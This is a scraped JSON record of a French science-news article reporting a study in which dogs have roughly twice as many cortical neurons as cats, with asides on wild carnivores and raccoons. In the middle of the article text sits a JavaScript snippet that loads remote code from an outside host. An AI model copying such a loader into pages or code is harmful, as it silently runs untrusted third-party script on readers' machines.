{"title": "Les chiens sont plus intelligents que les chats", "newspaper": "Futura Sciences", "author": "Nathalie Mayer", "date_publi": "03/12/2017", "content": "Il y a ceux qui sont plutôt chats. Il y a ceux qui sont plutôt chiens. Et entre les deux, c'est parfois un peu la guerre. Une guerre qui pourrait bien être relancée par une étude américaine qui affirme que les chiens sont plus intelligents que les chats ! Juger de l’intelligence . Voilà qui semble ne pas être aisé tant cette aptitude est diverse. Et qu'il s'agisse de comparer des Hommes ou des animaux. Pourtant, des chercheurs de l' université de Vanderbilt  (États-Unis) affirment aujourd'hui que les  chiens sont plus intelligents  que les chats. Une nouvelle qui risque bien de remettre le  feu  aux poudres de la petite guerre que se mènent passionnés des chats et amoureux des  chiens . Pour parvenir à cette conclusion, les chercheurs américains ont simplement compté le  nombre de neurones  formant le  cortex cérébral  de chiens, de chats et d'autres  espèces  de  carnivores . Pourquoi ? Parce que le  cortex  cérébral — et les petites cellules grises qu'il renferme — est le siège de la pensée, de la planification et d'autres comportements complexes. “ 530 millions de neurones corticaux pour le chien, 250 millions pour le chat ! Résultat : pas moins de 530 millions de  neurones  corticaux pour le chien — contre plus de 16 milliards pour l'Homme, tout de même — et seulement 250 millions pour le chat ! Pour les chercheurs américains, les chiffres parlent d'eux-mêmes.  « Le nombre absolu de neurones dans le cortex cérébral détermine la richesse de l'état mental de l'animal et sa capacité à prédire ce qui va se passer dans son environnement » , assure Suzana Herculano-Houzel, professeur de psychologie et de sciences biologiques à l'université de Vanderbilt. Sur cette illustration, les cerveaux de six des carnivores étudiés par les chercheurs de l’université de Vanderbilt. Notez que celui de l’ours, par exemple, est dix fois plus gros que celui du chat. Pourtant, il contient autant de neurones corticaux. © Suzana Herculano-Houzel, université de Vanderbilt                       Une étude pleine de surprises Si donc le chien est plus intelligent que le chat, qu'en est-il de leurs cousins sauvages ? L'opinion majoritaire veut que les cerveaux des  animaux domestiques  soient plus petits. Or, l'étude des chercheurs américains montre le contraire. Le  cerveau  d'un  golden retriever  possède bien plus de neurones que celui d'une hyène. Le saviez-vous ? Le terme carnivore est utilisé ici pour désigner non pas tous les animaux qui se nourrissent d'autres animaux mais un groupe particulier de mammifères (un ordre). Le clade des carnivores comprend environ 280 espèces, par exemple les félins, les ours, les martes et les ratons laveurs. Il est de même rang que, par exemple, les primates et les rongeurs.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Autre surprise : les cerveaux des carnivores ne sont pas mieux dotés en neurones que ceux des  herbivores  dont ils se nourrissent. La chasse, pourtant, semble une activité cognitivement plus exigeante que le broutage. Mais plus un cerveau contient de neurones, plus il devient gourmand en  énergie . Et les grands chasseurs le savent bien, leur alimentation peut s'avérer extrêmement intermittente. De quoi, pensent les chercheurs américains, limiter leur développement cérébral. Et si une palme doit être décernée, c'est... au  raton laveur  qu'elle reviendra.  « Le cerveau du raton laveur apparaît relativement petit. Mais la densité de ses neurones équivaut à celle d'un  primate  » , s'étonne le professeur Herculano-Houzel. Ce qu'il faut retenir Le cortex cérébral — siège de fonctions neurologiques évoluées — des chiens contient environ deux fois plus de neurones que celui des chats. Les animaux domestiques sont au moins aussi bien pourvus en neurones que leurs cousins sauvages. Les cerveaux des carnivores ne sont pas nécessairement mieux dotés en neurones que ceux des herbivores. Le raton laveur, avec son petit cerveau riche en neurones, fait figure de carnivore hors du commun. Cela vous intéressera aussi Intelligence animale : l'éléphant aurait conscience de son corps                       Un éléphant d'Asie a réussi brillamment un test d'intelligence auquel échoue un enfant de deux ans : on ne peut pas tirer un tapis si on est dessus. Réalisée par l'association Think Elephants International, l'expérience montre que l'éléphant a conscience de son propre corps, comme le montre également le test du miroir. Une capacité rare dans le monde animal.                                       ", "theme": "planete"}